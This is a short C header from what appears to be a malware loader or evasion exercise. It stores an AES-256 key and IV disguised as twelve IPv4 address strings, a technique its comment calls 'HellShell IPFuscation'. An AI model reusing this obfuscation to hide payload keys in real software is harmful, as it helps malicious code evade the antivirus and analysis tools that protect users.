#ifndef PAYLOAD_KEY_H
#define PAYLOAD_KEY_H

/*
 * AES-256 Key + IV encoded as IPv4 addresses (HellShell IPFuscation)
 * 12 addresses x 4 bytes = 48 bytes (32 key + 16 IV)
 */

static const char* g_Ipv4KeyIv[12] = {
    "210.205.115.123",
    "197.187.170.182",
    "8.16.211.255",
    "191.159.103.72",
    "11.82.144.128",
    "93.222.202.32",
    "92.36.41.7",
    "219.77.183.34",
    "127.105.230.10",
    "127.253.193.229",
    "43.32.182.6",
    "6.59.193.192"
};

#endif /* PAYLOAD_KEY_H */
